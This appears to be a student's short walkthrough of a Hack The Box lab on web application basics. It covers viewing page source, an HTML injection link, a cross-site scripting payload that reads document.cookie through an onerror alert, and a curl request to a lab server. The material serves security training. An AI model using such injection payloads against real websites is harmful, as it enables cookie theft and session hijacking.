# Introduction to Web Applications

## Sensitive Data Exposure

go to the IP address url and press 'ctl+u' to see the source code

![image](https://user-images.githubusercontent.com/34996954/172033418-b27b6be7-aefe-465d-ad0e-33892ce76248.png)


## HTML Injection

Insert the following in the input box: 

```
<a href="http://www.hackthebox.com">Click Me</a>
```

![image](https://user-images.githubusercontent.com/34996954/172033437-4a793559-b97c-4d4c-b6f2-1415fcebff22.png)


## Cross-Site Scripting (XSS)


Insert the following in the input box: 

```
#"><img src=/ onerror=alert(document.cookie)>
```

![image](https://user-images.githubusercontent.com/34996954/172033454-ab6bf8aa-89a3-459f-ba59-57f3f9303bd6.png)

![image](https://user-images.githubusercontent.com/34996954/172033472-7e01233f-f8d6-4522-bccd-195292bb755e.png)


## Development Frameworks & APIs

```
curl -X GET 188.166.172.138:31319/index.php?id=1
```

